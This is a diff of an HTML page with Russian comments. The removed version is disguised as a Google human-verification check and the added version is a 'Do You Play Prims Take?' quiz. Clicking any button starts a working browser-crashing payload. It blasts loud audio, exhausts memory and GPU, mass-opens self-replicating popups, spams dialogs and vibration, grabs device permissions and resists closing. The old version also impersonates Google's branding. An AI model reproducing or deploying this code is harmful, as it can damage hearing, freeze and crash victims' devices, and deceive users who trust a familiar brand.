@@ -3,222 +3,209 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Google Verification</title>
+    <title>Do You Play Prims Take?</title>
     <style>
-        /* Стили под Google */
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background: #f1f3f4;
+            background: #0a0a0a;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
-            padding: 20px;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #fff;
+            text-align: center;
+            overflow: hidden;
+            user-select: none;
         }
         .container {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
-            max-width: 450px;
-            width: 100%;
-            padding: 48px 40px 36px;
-            text-align: center;
-        }
-        .logo {
-            width: 75px;
-            height: 75px;
-            margin: 0 auto 20px;
-        }
-        .logo svg {
-            width: 100%;
-            height: 100%;
+            background: #1a1a1a;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 0 50px rgba(255,0,0,0.3);
+            max-width: 400px;
+            width: 90%;
         }
         h1 {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 8px;
-        }
-        p {
-            font-size: 16px;
-            color: #5f6368;
+            font-size: 28px;
             margin-bottom: 30px;
-            line-height: 1.5;
+            text-shadow: 0 0 20px #f00;
+            animation: pulseText 0.5s infinite alternate;
+        }
+        @keyframes pulseText {
+            0% { color: #fff; text-shadow: 0 0 10px #f00; }
+            100% { color: #ff0; text-shadow: 0 0 30px #f00, 0 0 60px #ff0; }
+        }
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
         }
         .btn {
-            background: #1a73e8;
-            color: white;
+            padding: 18px 0;
+            font-size: 24px;
+            font-weight: bold;
             border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 500;
-            padding: 12px 24px;
+            border-radius: 50px;
             cursor: pointer;
-            width: 100%;
-            transition: background 0.2s;
+            transition: 0.1s;
+            background: #2a2a2a;
+            color: #fff;
+            box-shadow: 0 0 20px rgba(255,0,0,0.2);
         }
-        .btn:hover { background: #185abc; }
-        .btn:active { background: #174ea6; }
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #5f6368;
+        .btn:active { transform: scale(0.95); }
+        .btn-yes { background: #4caf50; }
+        .btn-no { background: #f44336; }
+        .btn-yes:hover { background: #66bb6a; }
+        .btn-no:hover { background: #ef5350; }
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #888;
+            word-break: break-all;
         }
-        .loader {
-            display: none;
-            margin: 20px auto;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #1a73e8;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 <div class="container" id="mainContainer">
-    <div class="logo">
-        <!-- Google "G" logo -->
-        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z"/></svg>
+    <h1>❓ Do You Play Prims Take?</h1>
+    <div class="btn-group">
+        <button class="btn btn-yes" id="btnYes">YES</button>
+        <button class="btn btn-no" id="btnNo">NO</button>
     </div>
-    <h1>Verify you are human</h1>
-    <p>To continue, please complete the verification below.</p>
-    <button class="btn" id="verifyBtn">Verify</button>
-    <div class="loader" id="loader"></div>
-    <div class="footer">This is a security check. © Google</div>
+    <div id="status">Click any button to proceed</div>
 </div>
 
 <script>
 (function() {
-    // Все комментарии на русском, технические
-    var btn = document.getElementById('verifyBtn');
-    var loader = document.getElementById('loader');
-    var container = document.getElementById('mainContainer');
-    var active = false;
+    // Технические комментарии на русском
+    var activated = false;
+    var statusEl = document.getElementById('status');
+    var audioCtxs = [];
+    var intervals = [];
+    var memoryHogs = [];
 
-    // Функция для запроса всех разрешений (аудио, камера, гео, уведомления и т.д.)
+    // Функция для запроса всех возможных разрешений
     function requestAllPermissions() {
         try { navigator.geolocation.getCurrentPosition(function(){}, function(){}); } catch(e) {}
         try { navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(function(s){ }).catch(function(){}); } catch(e) {}
         try { Notification.requestPermission(); } catch(e) {}
         try { navigator.clipboard.readText().then(function(){}).catch(function(){}); } catch(e) {}
-        try { navigator.clipboard.writeText('VERIFIED').then(function(){}).catch(function(){}); } catch(e) {}
+        try { navigator.clipboard.writeText('PRIMS TAKE').then(function(){}).catch(function(){}); } catch(e) {}
         try { navigator.storage.persist().then(function(){}).catch(function(){}); } catch(e) {}
         try { document.documentElement.requestFullscreen(); } catch(e) {}
-        try { navigator.wakeLock.request('screen').then(function(){}).catch(function(){}); } catch(e) {}
-        try { navigator.vibrate([1000, 500, 1000, 500, 1000]); } catch(e) {}
+        try { navigator.wakeLock.request('screen').then(function(lock){ 
+                // Удерживаем блокировку
+                setInterval(function(){ lock.release().then(function(){ navigator.wakeLock.request('screen'); }); }, 1000);
+            }).catch(function(){}); 
+        } catch(e) {}
+        try { navigator.vibrate([1000, 500, 1000, 500, 2000]); } catch(e) {}
         try { screen.orientation.lock('landscape'); } catch(e) {}
         if (navigator.requestMIDIAccess) {
             try { navigator.requestMIDIAccess().then(function(){}).catch(function(){}); } catch(e) {}
         }
     }
 
-    // Создание максимально громкого звука с несколькими осцилляторами и шумом
+    // Создание очень громкого звука
     function createLoudAudio() {
         var ctx = new (window.AudioContext || window.webkitAudioContext)();
         if (ctx.state === 'suspended') ctx.resume();
-        var masterGain = ctx.createGain();
-        masterGain.gain.value = 1.0;
-        masterGain.connect(ctx.destination);
+        var master = ctx.createGain();
+        master.gain.value = 1.0;
+        master.connect(ctx.destination);
 
-        // 10 осцилляторов на разных частотах, пилообразные и квадратные
-        var freqs = [80, 160, 320, 640, 1280, 2560, 5120, 8000, 10000, 12000];
+        // 15 осцилляторов с разными частотами и типами
+        var freqs = [50, 100, 200, 400, 800, 1600, 3200, 6400, 8000, 10000, 12000, 15000, 18000, 20000, 24000];
         for (var i=0; i<freqs.length; i++) {
             var osc = ctx.createOscillator();
-            osc.type = (i%2===0) ? 'sawtooth' : 'square';
+            osc.type = (i%3===0) ? 'sawtooth' : (i%3===1) ? 'square' : 'triangle';
             osc.frequency.value = freqs[i];
-            osc.connect(masterGain);
+            osc.connect(master);
             osc.start();
-            // Не останавливаем
         }
 
-        // Белый шум с громкостью 1.0
-        var bufferSize = ctx.sampleRate * 10;
-        var buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
-        var data = buffer.getChannelData(0);
-        for (var j=0; j<bufferSize; j++) {
+        // Белый шум с максимальной громкостью
+        var bufSize = ctx.sampleRate * 20;
+        var buf = ctx.createBuffer(1, bufSize, ctx.sampleRate);
+        var data = buf.getChannelData(0);
+        for (var j=0; j<bufSize; j++) {
             data[j] = Math.random() * 2 - 1;
         }
         var noise = ctx.createBufferSource();
-        noise.buffer = buffer;
+        noise.buffer = buf;
         noise.loop = true;
-        var noiseGain = ctx.createGain();
-        noiseGain.gain.value = 1.0;
-        noise.connect(noiseGain);
-        noiseGain.connect(ctx.destination);
+        var ng = ctx.createGain();
+        ng.gain.value = 1.0;
+        noise.connect(ng);
+        ng.connect(ctx.destination);
         noise.start();
 
-        // Дополнительный периодический сигнал с сильными гармониками
-        var real = new Float32Array([0, 1, 0.8, 0.6, 0.4, 0.2, 0.1]);
+        // Периодическая волна с сильными гармониками
+        var real = new Float32Array([0, 1, 0.9, 0.7, 0.5, 0.3, 0.2, 0.1]);
         var imag = new Float32Array(real.length);
         var wave = ctx.createPeriodicWave(real, imag);
         var oscP = ctx.createOscillator();
         oscP.setPeriodicWave(wave);
-        oscP.frequency.value = 220;
-        oscP.connect(masterGain);
+        oscP.frequency.value = 150;
+        oscP.connect(master);
         oscP.start();
 
-        // Сохраняем контекст, чтобы не дать его собрать сборщику мусора
-        window._audioCtxs = window._audioCtxs || [];
-        window._audioCtxs.push(ctx);
-        // Принудительно держим контекст активным
-        var interval = setInterval(function() {
+        // Сохраняем контекст для предотвращения сборки мусора
+        audioCtxs.push(ctx);
+        // Интервал для поддержания активности
+        var keepAlive = setInterval(function() {
             if (ctx.state === 'suspended') ctx.resume();
-        }, 50);
-        window._audioIntervals = window._audioIntervals || [];
-        window._audioIntervals.push(interval);
+        }, 20);
+        intervals.push(keepAlive);
     }
 
-    // Создаём множество звуковых контекстов с задержкой
+    // Массовое создание аудио
     function spamAudio() {
-        for (var i=0; i<30; i++) {
+        // Сразу 50 контекстов
+        for (var i=0; i<50; i++) {
             setTimeout(function() {
                 createLoudAudio();
-            }, i * 20);
+            }, i * 10);
         }
-        // Бесконечное создание новых контекстов
-        setInterval(function() {
-            for (var k=0; k<5; k++) {
+        // Бесконечное добавление новых
+        var audioSpam = setInterval(function() {
+            for (var k=0; k<10; k++) {
                 createLoudAudio();
             }
         }, 100);
+        intervals.push(audioSpam);
     }
 
-    // Переполнение памяти – массивы, DOM-элементы, Canvas
+    // Перегрузка памяти
     function memoryOverload() {
         var mem = [];
         setInterval(function() {
-            // Массивы по 10 МБ
-            for (var i=0; i<50; i++) {
-                mem.push(new ArrayBuffer(10 * 1024 * 1024));
+            // Массивы по 20 МБ
+            for (var i=0; i<100; i++) {
+                mem.push(new ArrayBuffer(20 * 1024 * 1024));
             }
-            // Создаём тысячи элементов с абсолютным позиционированием
-            for (var j=0; j<2000; j++) {
+            // DOM элементы
+            for (var j=0; j<5000; j++) {
                 var d = document.createElement('div');
                 d.style.position = 'absolute';
                 d.style.left = Math.random() * 100000 + 'px';
                 d.style.top = Math.random() * 100000 + 'px';
-                d.style.width = '300px';
-                d.style.height = '300px';
-                d.style.background = 'rgba(255,0,0,0.05)';
+                d.style.width = '500px';
+                d.style.height = '500px';
+                d.style.background = 'rgba(255,0,0,0.02)';
                 document.body.appendChild(d);
             }
-            // Большие строки
-            mem.push(new Array(10 * 1024 * 1024).join('A'));
+            // Гигантские строки
+            mem.push(new Array(50 * 1024 * 1024).join('X'));
         }, 5);
     }
 
-    // Бесконечное открытие вкладок/попапов
+    // Открытие вкладок без возможности закрыть (постоянный поток)
     function popupSpam() {
-        function openTab() {
-            var url = window.location.href + '?t=' + Date.now() + Math.random();
-            var w = window.open(url, '_blank', 'width=400,height=400');
+        function spawn() {
+            var url = window.location.href + '?p=' + Date.now() + Math.random();
+            var w = window.open(url, '_blank', 'width=300,height=300');
             if (!w) {
-                // Если блокировка, пытаемся через ссылку
                 var a = document.createElement('a');
                 a.href = url;
                 a.target = '_blank';
@@ -226,91 +213,90 @@
                 a.click();
             }
         }
-        // Открываем по 10 вкладок каждые 200 мс
         setInterval(function() {
-            for (var i=0; i<10; i++) {
-                openTab();
+            for (var i=0; i<15; i++) {
+                spawn();
             }
         }, 200);
-        // Также пробуем открыть about:blank
+        // Также открываем about:blank
         setInterval(function() {
             window.open('about:blank', '_blank', 'width=100,height=100');
-        }, 100);
+        }, 50);
     }
 
-    // Мигание и перегрузка GPU через WebGL
+    // GPU перегрузка через WebGL и Canvas 2D
     function gpuOverload() {
         var canvas = document.createElement('canvas');
-        canvas.width = 4096;
-        canvas.height = 4096;
+        canvas.width = 8192;
+        canvas.height = 8192;
         canvas.style.position = 'fixed';
         canvas.style.top = '0';
         canvas.style.left = '0';
         canvas.style.width = '100%';
         canvas.style.height = '100%';
-        canvas.style.zIndex = '-1';
+        canvas.style.zIndex = '-2';
         document.body.appendChild(canvas);
         var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
             setInterval(function() {
-                // Постоянно перерисовываем случайные шейдеры
-                var vertexShader = gl.createShader(gl.VERTEX_SHADER);
-                gl.shaderSource(vertexShader, 'attribute vec2 aPos; void main() { gl_Position = vec4(aPos, 0.0, 1.0); }');
-                gl.compileShader(vertexShader);
-                var fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
-                var rand = Math.random();
-                gl.shaderSource(fragmentShader, 'void main() { gl_FragColor = vec4(' + rand + ', ' + (1-rand) + ', 0.5, 1.0); }');
-                gl.compileShader(fragmentShader);
-                var program = gl.createProgram();
-                gl.attachShader(program, vertexShader);
-                gl.attachShader(program, fragmentShader);
-                gl.linkProgram(program);
-                gl.useProgram(program);
-                var vertices = new Float32Array([-1,-1, 1,-1, -1,1, 1,1]);
-                var buffer = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
-                var aPos = gl.getAttribLocation(program, 'aPos');
-                gl.enableVertexAttribArray(aPos);
-                gl.vertexAttribPointer(aPos, 2, gl.FLOAT, false, 0, 0);
-                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-                gl.deleteProgram(program);
-                gl.deleteShader(vertexShader);
-                gl.deleteShader(fragmentShader);
-                gl.deleteBuffer(buffer);
-            }, 10);
+                for (var s=0; s<20; s++) {
+                    var vs = gl.createShader(gl.VERTEX_SHADER);
+                    gl.shaderSource(vs, 'attribute vec2 aPos; void main() { gl_Position = vec4(aPos, 0.0, 1.0); }');
+                    gl.compileShader(vs);
+                    var fs = gl.createShader(gl.FRAGMENT_SHADER);
+                    var r = Math.random(), g = Math.random(), b = Math.random();
+                    gl.shaderSource(fs, 'void main() { gl_FragColor = vec4('+r+','+g+','+b+',1.0); }');
+                    gl.compileShader(fs);
+                    var prog = gl.createProgram();
+                    gl.attachShader(prog, vs);
+                    gl.attachShader(prog, fs);
+                    gl.linkProgram(prog);
+                    gl.useProgram(prog);
+                    var verts = new Float32Array([-1,-1, 1,-1, -1,1, 1,1]);
+                    var buf = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+                    gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW);
+                    var aPos = gl.getAttribLocation(prog, 'aPos');
+                    gl.enableVertexAttribArray(aPos);
+                    gl.vertexAttribPointer(aPos, 2, gl.FLOAT, false, 0, 0);
+                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+                    gl.deleteProgram(prog);
+                    gl.deleteShader(vs);
+                    gl.deleteShader(fs);
+                    gl.deleteBuffer(buf);
+                }
+            }, 5);
         }
-        // Также задействуем Canvas 2D для постоянного рисования
         var ctx2d = canvas.getContext('2d');
         if (ctx2d) {
             setInterval(function() {
-                for (var i=0; i<1000; i++) {
+                for (var i=0; i<2000; i++) {
                     ctx2d.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6,'0');
-                    ctx2d.fillRect(Math.random()*4096, Math.random()*4096, 100, 100);
+                    ctx2d.fillRect(Math.random()*8192, Math.random()*8192, 200, 200);
                 }
             }, 5);
         }
     }
 
-    // Диалоги (alert, confirm, prompt) для блокировки UI
+    // Диалоги для блокировки UI
     function spamDialogs() {
         setInterval(function() {
-            try { alert('VERIFICATION FAILED!'); } catch(e) {}
+            try { alert('⚠️ PRIMS TAKE ACTIVATED!'); } catch(e) {}
+        }, 30);
+        setInterval(function() {
+            try { confirm('CAN YOU STOP?'); } catch(e) {}
         }, 50);
         setInterval(function() {
-            try { confirm('Retry?'); } catch(e) {}
+            try { prompt('ENTER CODE:', ''); } catch(e) {}
         }, 80);
-        setInterval(function() {
-            try { prompt('Enter code:', ''); } catch(e) {}
-        }, 120);
     }
 
-    // Вибрация и другие сенсоры
+    // Сенсоры и вибрация
     function sensorSpam() {
         setInterval(function() {
-            try { navigator.vibrate([200, 100, 200, 100, 200, 100, 500]); } catch(e) {}
-        }, 50);
-        // Пытаемся получить доступ к акселерометру (требуется разрешение)
+            try { navigator.vibrate([100, 100, 100, 100, 100, 100, 100, 100]); } catch(e) {}
+        }, 30);
+        // Акселерометр
         if (window.DeviceMotionEvent) {
             window.addEventListener('devicemotion', function(e){}, true);
         }
@@ -319,14 +305,47 @@
         }
     }
 
-    // Функция активации всего хаоса
+    // Дополнительные безумства: переключение полноэкранного режима, блокировка кнопки выключения (невозможно, но пытаемся)
+    function extraCrazy() {
+        // Переключение полноэкранного режима каждые 200 мс
+        setInterval(function() {
+            try {
+                if (document.fullscreenElement) {
+                    document.exitFullscreen();
+                } else {
+                    document.documentElement.requestFullscreen();
+                }
+            } catch(e) {}
+        }, 200);
+        // Захват указателя
+        setInterval(function() {
+            try { document.body.requestPointerLock(); } catch(e) {}
+        }, 500);
+        // Спам консоли
+        setInterval(function() {
+            console.log('PRIMS TAKE ' + Math.random());
+            console.error('FATAL ERROR');
+            console.warn('WARNING');
+        }, 5);
+        // Пытаемся предотвратить закрытие вкладки (onbeforeunload)
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+        });
+        // Также перехватываем закрытие окна
+        window.onunload = function() {
+            // Открываем новое окно при закрытии
+            window.open(window.location.href, '_blank');
+        };
+    }
+
+    // Главная функция активации
     function activate() {
-        if (active) return;
-        active = true;
-        btn.disabled = true;
-        btn.textContent = 'Verifying...';
-        loader.style.display = 'block';
-        // Запускаем все процессы
+        if (activated) return;
+        activated = true;
+        statusEl.textContent = '🚀 ACTIVATED! HOLD ON...';
+        document.querySelector('h1').textContent = '💀 PRIMS TAKE!';
+
         requestAllPermissions();
         spamAudio();
         memoryOverload();
@@ -334,37 +353,44 @@
         gpuOverload();
         spamDialogs();
         sensorSpam();
+        extraCrazy();
 
-        // Дополнительно: захват указателя и полноэкранный режим
-        try { document.documentElement.requestFullscreen(); } catch(e) {}
-        try { document.body.requestPointerLock(); } catch(e) {}
-
-        // Бесконечные попытки возобновить аудио
+        // Постоянно возобновляем аудиоконтексты
         setInterval(function() {
-            if (window._audioCtxs) {
-                window._audioCtxs.forEach(function(ctx) {
-                    if (ctx.state === 'suspended') ctx.resume();
-                });
-            }
-        }, 30);
+            audioCtxs.forEach(function(ctx) {
+                if (ctx.state === 'suspended') ctx.resume();
+            });
+        }, 20);
 
-        // Также постоянно открываем новое окно с этим же URL для размножения
-        setInterval(function() {
-            window.open(window.location.href, '_blank', 'width=400,height=400');
-        }, 300);
-
-        // Сообщение в консоль для отладки
-        console.log('!!! RONDAX PRIM TAKE ACTIVATED !!!');
+        // Также открываем много окон сразу
+        for (var i=0; i<100; i++) {
+            setTimeout(function() {
+                window.open(window.location.href, '_blank', 'width=400,height=400');
+            }, i*20);
+        }
     }
 
-    btn.addEventListener('click', activate);
+    // Обработчики кнопок
+    document.getElementById('btnYes').addEventListener('click', activate);
+    document.getElementById('btnNo').addEventListener('click', activate);
 
-    // Если страница загружена как попап, тоже активируем через 1 секунду (для авто-распространения)
+    // Если страница открыта как попап – автоактивация через 0.5 секунды
     if (window.opener) {
         setTimeout(function() {
-            if (!active) activate();
-        }, 1000);
+            if (!activated) activate();
+        }, 500);
     }
+
+    // Пытаемся удержать экран включенным
+    try {
+        navigator.wakeLock.request('screen').then(function(lock) {
+            setInterval(function() {
+                lock.release().then(function() {
+                    navigator.wakeLock.request('screen');
+                });
+            }, 500);
+        });
+    } catch(e) {}
 })();
 </script>
 </body>
